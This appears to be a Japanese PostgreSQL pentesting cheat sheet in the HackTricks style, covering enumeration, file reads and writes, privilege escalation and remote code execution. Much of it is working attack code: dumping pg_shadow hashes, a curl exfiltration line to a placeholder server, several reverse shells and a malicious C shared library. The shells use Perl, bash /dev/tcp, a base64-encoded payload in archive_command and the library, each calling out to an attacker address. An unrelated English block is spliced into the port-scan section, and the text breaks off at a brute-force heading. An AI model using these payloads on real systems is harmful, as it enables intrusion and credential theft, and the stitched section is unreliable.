# 5432,5433 - PostgreSQLのペンテスト

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で最も**高度な**コミュニティツールによって**強化**された**ワークフローを簡単に構築**および**自動化**します。\
今すぐアクセスしてください：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>**htARTE（HackTricks AWS Red Team Expert）**で**ゼロからヒーローまでのAWSハッキング**を学びましょう！</summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝**したい場合や**HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手してください
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つけてください
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出して、あなたのハッキングトリックを共有してください。

</details>

## **基本情報**

**PostgreSQL**は、**オープンソース**の**オブジェクトリレーショナルデータベースシステム**として説明されています。このシステムはSQL言語を利用するだけでなく、追加の機能で拡張しています。その機能により、さまざまなデータ型や操作を処理できるため、開発者や組織にとって多目的な選択肢となっています。

**デフォルトポート:** 5432で、このポートがすでに使用されている場合、おそらく使用されていない次のポート（5433の可能性が高い）がPostgreSQLによって使用されるようです。
```
PORT     STATE SERVICE
5432/tcp open  pgsql
```
## 接続と基本的な列挙
```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
SELECT user;

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```
{% hint style="warning" %}
**`\list`**を実行すると、**`rdsadmin`**というデータベースが見つかった場合、**AWSのPostgreSQLデータベース**内にいることがわかります。
{% endhint %}

**PostgreSQLデータベースを悪用する方法**の詳細については、以下をチェックしてください：

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/" %}
[postgresql-injection](../pentesting-web/sql-injection/postgresql-injection/)
{% endcontent-ref %}

## 自動列挙
```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```
### [**Brute force**](../generic-methodologies-and-resources/brute-force.md#postgresql)

### **ポートスキャン**

[**この研究**](https://www.exploit-db.com/papers/13084)によると、接続試行が失敗すると、`dblink`は`sqlclient_unable_to_establish_sqlconnection`例外をスローし、エラーの説明が含まれます。これらの詳細の例は以下にリストされています。
```sql
SELECT * FROM dblink_connect('host=1.2.3.4
port=5678
user=name
password=secret
dbname=abc
connect_timeout=10');
```
* ホストがダウンしています

`詳細: サーバーに接続できませんでした: ホストへのルートがありません ホスト「1.2.3.4」でサーバーが実行され、ポート5678でTCP/IP接続を受け入れていますか？`

* ポートが閉じています
```
DETAIL:  could not connect to server: Connection refused Is  the  server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
* ポートが開いています
```
DETAIL:  server closed the connection unexpectedly This  probably  means
the server terminated abnormally before or while processing the request
```
```md
## PostgreSQL

### Enumeration

To discover PostgreSQL services running on the target system, you can use tools like Nmap to scan for open ports. The default port for PostgreSQL is 5432.

```bash
nmap -sV -p 5432 <target_ip>
```

### Brute Forcing

You can use tools like Metasploit or Hydra to perform brute force attacks against PostgreSQL. Make sure to use a strong password list for better results.

### Exploitation

One common way to exploit PostgreSQL is through SQL injection attacks. By injecting malicious SQL queries, an attacker can manipulate the database and potentially gain unauthorized access.

### Post-Exploitation

After gaining access to a PostgreSQL database, an attacker can exfiltrate sensitive data, create backdoors for future access, or even delete data to cause disruption.

### Countermeasures

To protect PostgreSQL from attacks, ensure that you are using strong and unique passwords, keeping the software up to date with the latest security patches, and monitoring the database for any suspicious activity.
```
```
DETAIL:  FATAL:  password authentication failed for user "name"
```
* ポートが開いているかフィルタリングされています
```
DETAIL:  could not connect to server: Connection timed out Is the server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
## 特権の列挙

### ロール

| ロールの種類   |                                                                                                                                                      |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| rolsuper       | ロールにはスーパーユーザー権限があります                                                                                                             |
| rolinherit     | ロールは自動的に、そのメンバーであるロールの権限を継承します                                                                                           |
| rolcreaterole  | ロールは他のロールを作成できます                                                                                                                      |
| rolcreatedb    | ロールはデータベースを作成できます                                                                                                                    |
| rolcanlogin    | ロールはログインできます。つまり、このロールは初期セッション認証識別子として指定できます                                                             |
| rolreplication | ロールはレプリケーションロールです。レプリケーションロールはレプリケーション接続を開始し、レプリケーションスロットを作成および削除できます。           |
| rolconnlimit   | ログインできるロールに対して、この設定はこのロールが作成できる同時接続の最大数を設定します。-1 は制限なしを意味します。                        |
| rolpassword    | パスワードではなく（常に `********` として表示されます）                                                                                               |
| rolvaliduntil  | パスワードの有効期限（パスワード認証にのみ使用されます）；有効期限がない場合は null                                                                  |
| rolbypassrls   | ロールはすべての行レベルセキュリティポリシーをバイパスします。詳細については[セクション 5.8](https://www.postgresql.org/docs/current/ddl-rowsecurity.html)を参照してください。 |
| rolconfig      | 実行時の構成変数のロール固有のデフォルト                                                                                                             |
| oid            | ロールの ID                                                                                                                                         |

#### 興味深いグループ

- **`pg_execute_server_program`** のメンバーであれば、プログラムを**実行**できます
- **`pg_read_server_files`** のメンバーであれば、ファイルを**読み取る**ことができます
- **`pg_write_server_files`** のメンバーであれば、ファイルを**書き込む**ことができます

{% hint style="info" %}
Postgresでは、**ユーザー**、**グループ**、**ロール**は**同じ**です。それは単に、**どのように使用するか**と**ログインを許可するか**に依存します。
{% endhint %}
```sql
# Get users roles
\du

#Get users roles & groups
# r.rolpassword
# r.rolconfig,
SELECT
r.rolname,
r.rolsuper,
r.rolinherit,
r.rolcreaterole,
r.rolcreatedb,
r.rolcanlogin,
r.rolbypassrls,
r.rolconnlimit,
r.rolvaliduntil,
r.oid,
ARRAY(SELECT b.rolname
FROM pg_catalog.pg_auth_members m
JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
```
### テーブル
```sql
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
```
### 関数
```sql
# Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```
## ファイルシステムのアクション

### ディレクトリとファイルの読み取り

この[**commit**](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a)から、定義された**`DEFAULT_ROLE_READ_SERVER_FILES`**グループ（**`pg_read_server_files`**と呼ばれる）のメンバーや**スーパーユーザ**は、任意のパスで**`COPY`**メソッドを使用できます（`genfile.c`の`convert_and_check_filename`をチェックしてください）。
```sql
# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
```
{% hint style="warning" %}
スーパーユーザーではない場合でも、**CREATEROLE** 権限を持っていれば、**そのグループのメンバーになることができます:**
```sql
GRANT pg_read_server_files TO username;
```
[**詳細情報**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

**他のPostgres関数**を使用して**ファイルを読み取るかディレクトリをリストする**ことができます。これらを使用できるのは**スーパーユーザー**と**明示的な権限を持つユーザー**だけです。
```sql
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
```
You can find **more functions** in [https://www.postgresql.org/docs/current/functions-admin.html](https://www.postgresql.org/docs/current/functions-admin.html)

### シンプルなファイル書き込み

copyを使用してファイルを書き込むには、**スーパーユーザ**と**`pg_write_server_files`**のメンバーのみが使用できます。
```sql
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
```
{% endcode %}

{% hint style="warning" %}
**`CREATEROLE`** 権限を持っているがスーパーユーザーではない場合、**そのグループのメンバーになることができます:**
```sql
GRANT pg_write_server_files TO username;
```
[**詳細情報**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

COPYは改行文字を処理できないため、ベース64ペイロードを使用していても、**ワンライナーを送信する必要があります**。\
このテクニックの非常に重要な制限事項は、**`copy`はバイナリファイルを書き込むために使用できない**ということです。

### **バイナリファイルのアップロード**

ただし、**大きなバイナリファイルをアップロードするための他のテクニック**があります:

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md" %}
[big-binary-files-upload-postgresql.md](../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md)
{% endcontent-ref %}

## <img src="../.gitbook/assets/i3.png" alt="" data-size="original">

**バグバウンティのヒント**: **Intigriti**に**サインアップ**してください。これは、ハッカーによって作成されたプレミアム**バグバウンティプラットフォーム**です！[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)で参加し、今日から最大**$100,000**のバウンティを稼ぎましょう！

{% embed url="https://go.intigriti.com/hacktricks" %}

### ローカルファイル書き込みを介したPostgreSQLテーブルデータの更新

PostgreSQLサーバーファイルを読み書きする必要な権限がある場合、[PostgreSQLデータディレクトリ](https://www.postgresql.org/docs/8.1/storage.html)内の**関連ファイルノードを上書きすることでサーバー上の任意のテーブルを更新**できます。このテクニックについての詳細は[こちら](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users)。

必要な手順:

1. PostgreSQLデータディレクトリを取得

```sql
SELECT setting FROM pg_settings WHERE name = 'data_directory';
```

**注意:** 設定から現在のデータディレクトリパスを取得できない場合は、`SELECT version()`クエリを使用して主要なPostgreSQLバージョンをクエリし、パスをブルートフォースしてください。PostgreSQLのUnixインストールでの一般的なデータディレクトリパスは`/var/lib/PostgreSQL/MAJOR_VERSION/CLUSTER_NAME/`です。一般的なクラスタ名は`main`です。
2. ターゲットテーブルに関連するファイルノードへの相対パスを取得

```sql
SELECT pg_relation_filepath('{TABLE_NAME}')
```

このクエリは`base/3/1337`のようなものを返すはずです。ディスク上の完全なパスは`$DATA_DIRECTORY/base/3/1337`、つまり`/var/lib/postgresql/13/main/base/3/1337`になります。
3. `lo_*`関数を使用してファイルノードをダウンロード

```sql
SELECT lo_import('{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}',13337)
```
4. ターゲットテーブルに関連付けられたデータ型を取得

```sql
SELECT
STRING_AGG(
CONCAT_WS(
',',
attname,
typname,
attlen,
attalign
),
';'
)
FROM pg_attribute
JOIN pg_type
ON pg_attribute.atttypid = pg_type.oid
JOIN pg_class
ON pg_attribute.attrelid = pg_class.oid
WHERE pg_class.relname = '{TABLE_NAME}';
```
5. [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor)を使用して、[ファイルノードを編集](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users)し、すべての`rol*`ブールフラグを1に設定して完全な権限を付与します。

```bash
python3 postgresql_filenode_editor.py -f {FILENODE} --datatype-csv {DATATYPE_CSV_FROM_STEP_4} -m update -p 0 -i ITEM_ID --csv-data {CSV_DATA}
```

![PostgreSQL Filenode Editor Demo](https://raw.githubusercontent.com/adeadfed/postgresql-filenode-editor/main/demo/demo_datatype.gif)
6. `lo_*`関数を使用して編集済みのファイルノードを再アップロードし、ディスク上の元のファイルを上書き

```sql
SELECT lo_from_bytea(13338,decode('{BASE64_ENCODED_EDITED_FILENODE}','base64'))
SELECT lo_export(13338,'{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}')
```
7. _(オプション)_ 高コストのSQLクエリを実行してインメモリテーブルキャッシュをクリア

```sql
SELECT lo_from_bytea(133337, (SELECT REPEAT('a', 128*1024*1024))::bytea)
```
8. これで、PostgreSQLで更新されたテーブル値が表示されるはずです。

`pg_authid`テーブルを編集することでスーパーアドミンになることもできます。**次のセクション**を参照してください[pentesting-postgresql.md#privesc-by-overwriting-internal-postgresql-tables](pentesting-postgresql.md#privesc-by-overwriting-internal-postgresql-tables)。

## RCE

### **プログラムへのRCE**

[バージョン9.3](https://www.postgresql.org/docs/9.3/release-9-3.html)以降、**スーパーユーザー**と**`pg_execute_server_program`**グループのメンバーだけがRCEにCOPYを使用できます（情報漏えいの例:
```sql
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
```
実行例：
```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
{% hint style="warning" %}
スーパーユーザーではないが、**`CREATEROLE`** 権限を持っている場合、**そのグループのメンバーになることができます:**
```sql
GRANT pg_execute_server_program TO username;
```
[**詳細情報**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

または、**metasploit** の `multi/postgres/postgres_copy_from_program_cmd_exec` モジュールを使用します。\
この脆弱性に関する詳細は[**こちら**](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5)で確認できます。CVE-2019-9193として報告されましたが、Postgesはこれを[機能として修正しないことを宣言しました](https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/)。

### PostgreSQL言語を使用したRCE

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md" %}
[rce-with-postgresql-languages.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md)
{% endcontent-ref %}

### PostgreSQL拡張機能を使用したRCE

前の投稿から**バイナリファイルのアップロード方法**を学んだ後、**PostgreSQL拡張機能をアップロードして読み込む**ことでRCEを取得できます。

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md" %}
[rce-with-postgresql-extensions.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md)
{% endcontent-ref %}

### PostgreSQL構成ファイルRCE

{% hint style="info" %}
次のRCEベクターは、すべての手順をネストされたSELECTステートメントを介して実行できるため、制約されたSQLiコンテキストで特に有用です。
{% endhint %}

PostgreSQLの**構成ファイル**は**postgresユーザ**によって**書き込み可能**であり、これはデータベースを実行しているユーザであるため、**スーパーユーザ**としてファイルシステムにファイルを書き込むことができ、したがってこのファイルを**上書き**できます。

![](<../.gitbook/assets/image (303).png>)

#### **ssl\_passphrase\_command**を使用したRCE

このテクニックに関する詳細は[こちら](https://pulsesecurity.co.nz/articles/postgres-sqli)で確認できます。

構成ファイルにはRCEにつながる興味深い属性がいくつかあります:

* `ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'` データベースの秘密鍵へのパス
* `ssl_passphrase_command = ''` もし秘密ファイルがパスワードで保護されている場合、postgresqlはこの属性で指定されたコマンドを実行します。
* `ssl_passphrase_command_supports_reload = off` もしこの属性がonの場合、鍵がパスワードで保護されている場合に実行されるコマンドは、`pg_reload_conf()`が実行されたときに実行されます。

その後、攻撃者は次の手順を踏む必要があります:

1. サーバから**秘密鍵**をダンプする
2. ダウンロードした秘密鍵を**暗号化**する:
1. `rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key`
3. **上書き**
4. 現在のPostgreSQL **構成**をダンプする
5. 上記の属性構成で**構成**を**上書き**する:
1. `ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'`
2. `ssl_passphrase_command_supports_reload = on`
6. `pg_reload_conf()`を実行する

これをテストしてみたところ、**秘密鍵ファイルが権限640**である必要があり、**rootが所有**しており、**グループssl-certまたはpostgres**（つまりpostgresユーザが読み取れる）である必要があり、_ /var/lib/postgresql/12/main_に配置されている場合にのみ機能することに気づきました。

#### **archive\_command**を使用したRCE

**WALに関するこの構成とこの構成に関する詳細**は[こちら](https://medium.com/dont-code-me-on-that/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)**で確認できます。**

構成ファイルの別の属性である`archive_command`は悪用可能です。

これを機能させるには、`archive_mode`設定が`'on'`または`'always'`である必要があります。それが真であれば、`archive_command`でコマンドを上書きし、WAL（Write-Ahead Logging）操作を介して実行することができます。

一般的な手順は次のとおりです:

1. アーカイブモードが有効かどうかを確認する: `SELECT current_setting('archive_mode')`
2. `archive_command`にペイロードを上書きします。たとえば、リバースシェル: `archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307" | base64 --decode | perl'`
3. 構成を再読み込み: `SELECT pg_reload_conf()`
4. WAL操作を実行し、アーカイブコマンドを呼び出します: 一部のPostgresバージョンでは`SELECT pg_switch_wal()`または`SELECT pg_switch_xlog()`を使用します

#### **preloadライブラリを使用したRCE**

このテクニックに関する詳細は[こちら](https://adeadfed.com/posts/postgresql-select-only-rce/)で確認できます。

この攻撃ベクトルは次の構成変数を利用します:

* `session_preload_libraries` -- PostgreSQLサーバがクライアント接続時に読み込むライブラリ。
* `dynamic_library_path` -- PostgreSQLサーバがライブラリを検索するディレクトリのリスト。

`dynamic_library_path`の値を、データベースを実行している`postgres`ユーザが書き込み可能なディレクトリ（たとえば`/tmp/`ディレクトリ）に設定し、そこに悪意のある`.so`オブジェクトをアップロードします。次に、`session_preload_libraries`変数にそれを含めて、PostgreSQLサーバに新しくアップロードしたライブラリを読み込むようにします。

攻撃手順は次のとおりです:

1. 元の`postgresql.conf`をダウンロードする
2. `dynamic_library_path`値に`/tmp/`ディレクトリを含める。例: `dynamic_library_path = '/tmp:$libdir'`
3. `session_preload_libraries`値に悪意のあるライブラリ名を含める。例: `session_preload_libraries = 'payload.so'`
4. `SELECT version()`クエリを使用して主要なPostgreSQLバージョンを確認する
5. 正しいPostgreSQL devパッケージを使用して悪意のあるライブラリコードをコンパイルします。サンプルコード:

```c
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

void _init() {
/*
code taken from https://www.revshells.com/
*/

int port = REVSHELL_PORT;
struct sockaddr_in revsockaddr;

int sockt = socket(AF_INET, SOCK_STREAM, 0);
revsockaddr.sin_family = AF_INET;
revsockaddr.sin_port = htons(port);
revsockaddr.sin_addr.s_addr = inet_addr("REVSHELL_IP");

connect(sockt, (struct sockaddr *) &revsockaddr,
sizeof(revsockaddr));
dup2(sockt, 0);
dup2(sockt, 1);
dup2(sockt, 2);

char * const argv[] = {"/bin/bash", NULL};
execve("/bin/bash", argv, NULL);
}
```

コードのコンパイル:

```bash
gcc -I$(pg_config --includedir-server) -shared -fPIC -nostartfiles -o payload.so payload.c
```
6. ステップ2-3で作成した悪意のある`postgresql.conf`をアップロードし、元のファイルを上書きする
7. ステップ5で作成した`payload.so`を`/tmp`ディレクトリにアップロードする
8. サーバー構成を再読み込みするためにサーバーを再起動するか、`SELECT pg_reload_conf()`クエリを呼び出す
9. 次回のDB接続時にリバースシェル接続を受け取ります。
## **Postgres Privesc**

### CREATEROLE Privesc

#### **権限付与**

[**ドキュメント**](https://www.postgresql.org/docs/13/sql-grant.html)によると: _**`CREATEROLE`** 権限を持つロールは、**スーパーユーザーでない** 任意のロールのメンバーシップを**付与または取り消す**ことができます。_

したがって、**`CREATEROLE`** 権限があれば、自分自身に他の**ロール**へのアクセス権を付与できます（スーパーユーザーでない場合）。これにより、ファイルの読み書きやコマンドの実行が可能になります。
```sql
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
```
#### パスワードの変更

このロールを持つユーザーは、他の**非スーパーユーザー**の**パスワード**も**変更**できます。
```sql
#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
```
#### SUPERUSERへの昇格

**ローカルユーザーがパスワードを入力せずにPostgreSQLにログインできる**ことが一般的です。したがって、**コードを実行する権限を取得**したら、これらの権限を悪用して**`SUPERUSER`**ロールを取得できます。
```sql
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```
{% hint style="info" %}
これは通常、**`pg_hba.conf`** ファイル内の次の行によって可能になります：
```bash
# "local" is for Unix domain socket connections only
local   all             all                                     trust
# IPv4 local connections:
host    all             all             127.0.0.1/32            trust
# IPv6 local connections:
host    all             all             ::1/128                 trust
```
{% endhint %}

### **ALTER TABLE権限昇格**

[**この解説**](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities)では、ユーザーに付与されたALTER TABLE権限を悪用してPostgres GCPで権限昇格が可能だった方法が説明されています。

通常、**別のユーザーをテーブルの所有者にする**という操作はエラーが発生して阻止されるはずですが、GCPでは**スーパーユーザーでないpostgresユーザー**にそのオプションが与えられていたようです：

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

この考え方を利用して、**INSERT/UPDATE/ANALYZE**コマンドが**インデックス関数を持つテーブル**で実行されると、**関数**が**コマンドの一部として呼び出され、テーブルの所有者権限**で実行されるという事実を組み合わせると、スーパーユーザーに所有権限を与えたテーブルに関数を持つインデックスを作成し、その後、所有者の権限を使用してコマンドを実行できる悪意のある関数を使用してテーブル上でANALYZEを実行することが可能です。
```c
GetUserIdAndSecContext(&save_userid, &save_sec_context);
SetUserIdAndSecContext(onerel->rd_rel->relowner,
save_sec_context | SECURITY_RESTRICTED_OPERATION);
```
#### 搾取

1. 新しいテーブルを作成します。
2. テーブルに関連性のないコンテンツを挿入して、インデックス機能のデータを提供します。
3. 悪意のあるインデックス機能を開発し、コード実行ペイロードを含め、不正なコマンドの実行を許可します。
4. テーブルの所有者を「cloudsqladmin」に変更し、これはCloud SQLがデータベースを管理および維持するために独占的に使用するGCPのスーパーユーザーロールです。
5. テーブルに対してANALYZE操作を実行します。この操作により、PostgreSQLエンジンはテーブルの所有者である「cloudsqladmin」のユーザーコンテキストに切り替わります。したがって、悪意のあるインデックス機能は「cloudsqladmin」の権限で呼び出され、以前に許可されていなかったシェルコマンドの実行が可能になります。

PostgreSQLでは、このフローは次のようになります。
```sql
CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```
その後、`shell_commands_results` テーブルには実行されたコードの出力が含まれます:
```
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```
### ローカルログイン

一部の設定ミスのあるPostgreSQLインスタンスでは、どのローカルユーザーでもログインできる場合があり、**`dblink`関数**を使用して127.0.0.1からローカルログインすることが可能です。
```sql
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
port=5432
user=someuser
password=supersecret
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
{% hint style="warning" %}
前のクエリが機能するためには、**`dblink` 関数が存在する必要があります**。存在しない場合は、次のように作成してみることができます。
```sql
CREATE EXTENSION dblink;
```
{% endhint %}

もし特権を持つユーザーのパスワードを持っているが、そのユーザーが外部IPからのログインを許可されていない場合、次の関数を使用してそのユーザーとしてクエリを実行できます:
```sql
SELECT * FROM dblink('host=127.0.0.1
user=someuser
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
この関数が存在するかどうかを確認することができます:
```sql
SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
```
### **セキュリティデフィナーで定義されたカスタム関数**

[**この解説**](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql)では、IBMが提供するPostgresインスタンス内で、**SECURITY DEFINERフラグを持つこの関数**を見つけたため、ペンテスターは権限昇格に成功しました。

<pre class="language-sql"><code class="lang-sql">CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
RETURNS text
LANGUAGE 'plpgsql'
<strong>    VOLATILE SECURITY DEFINER
</strong>    PARALLEL UNSAFE
COST 100

AS $BODY$
DECLARE
persist_dblink_extension boolean;
BEGIN
persist_dblink_extension := create_dblink_extension();
PERFORM dblink_connect(format('dbname=%s', db_name));
PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
PERFORM dblink_disconnect();
…
</code></pre>

[**ドキュメントで説明されているように**](https://www.postgresql.org/docs/current/sql-createfunction.html)、**SECURITY DEFINERが設定された関数は**、**所有者の権限で実行**されます。したがって、関数が**SQLインジェクションに対して脆弱**であるか、**攻撃者によって制御されるパラメータで特権操作を行っている**場合、Postgres内で**権限昇格が悪用**される可能性があります。

前述のコードの4行目で、関数に**SECURITY DEFINER**フラグがあることがわかります。
```sql
CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
```
そして**コマンドを実行**してください：

<figure><img src="../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

### PL/pgSQLを使用したパスワードブルートフォース

**PL/pgSQL**は、SQLよりも大幅に手続き的な制御を提供する**完全な機能を備えたプログラミング言語**です。これにより、**ループ**や他の**制御構造**を使用してプログラムロジックを強化できます。さらに、**SQLステートメント**や**トリガー**は、**PL/pgSQL言語**を使用して作成された関数を呼び出す能力を持っています。この統合により、データベースプログラミングと自動化に対する包括的かつ多目的なアプローチが可能となります。\
